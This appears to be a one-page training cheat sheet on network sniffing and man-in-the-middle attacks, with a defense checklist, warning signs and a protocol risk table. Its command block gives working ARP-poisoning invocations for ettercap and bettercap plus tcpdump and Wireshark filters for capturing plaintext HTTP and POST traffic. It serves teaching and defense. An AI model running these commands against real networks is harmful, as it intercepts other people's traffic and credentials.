# One-Page Cheat Sheet — Sniffing, MITM & Defense

[← Back to README](../README.md)

## 🔑 Core Commands (Authorized Lab Use Only)

```bash
# Check routing / interface (Kali attacker box)
ip r

# Enable IP forwarding (required before any MITM relay)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Disable it again when done — always clean up
echo 0 > /proc/sys/net/ipv4/ip_forward

# Ettercap — text mode ARP poisoning MITM
ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/

# Ettercap — save captured logs
ettercap -T -M arp:remote /VICTIM_IP/ /GATEWAY_IP/ -L sniff_log
etterlog sniff_log.eci

# Ettercap GUI
ettercap -G

# Tcpdump — capture HTTP traffic on eth0
tcpdump -i eth0 tcp port 80

# Tcpdump — verbose hex/ASCII output
tcpdump -nn -v -X

# Wireshark filters
ip.addr == 192.168.1.10 && http
http.request.method == "POST"
tcp.port == 80

# Bettercap interactive shell
sudo bettercap -iface eth0
> net.probe on
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

## 🛡️ Defense Checklist

- [ ] All internal/external sites enforce HTTPS + HSTS
- [ ] Telnet replaced with SSH everywhere
- [ ] FTP replaced with SFTP/FTPS everywhere
- [ ] Email clients configured for IMAPS/POP3S (not plain IMAP/POP3)
- [ ] VPN used on any public/untrusted Wi-Fi
- [ ] Auto-connect to open Wi-Fi disabled on all devices
- [ ] ARP-spoofing detection tool deployed (XArp, arpwatch, or switch port security / Dynamic ARP Inspection)
- [ ] Personal/network firewall active and monitored
- [ ] Staff trained to check for the padlock icon and certificate warnings before login
- [ ] IDS/IPS (ideally ML-based with explainability) monitoring for ARP/MITM anomalies

## 🚩 Warning Signs of Active Sniffing/MITM

- Sudden LAN slowdown with no obvious cause
- Duplicate IP addresses reported on the network
- DNS resolving to unexpected IPs
- Browser certificate warnings on sites that normally load cleanly
- Devices randomly disconnecting or redirecting

## 📊 Protocol Risk Quick Reference

| Protocol | Risk | Fix |
|---|---|---|
| HTTP | Very High | HTTPS |
| FTP | Very High | SFTP / FTPS |
| Telnet | Extreme | SSH |
| POP3 / IMAP | High | POP3S / IMAPS |

---

[← Back to README](../README.md)
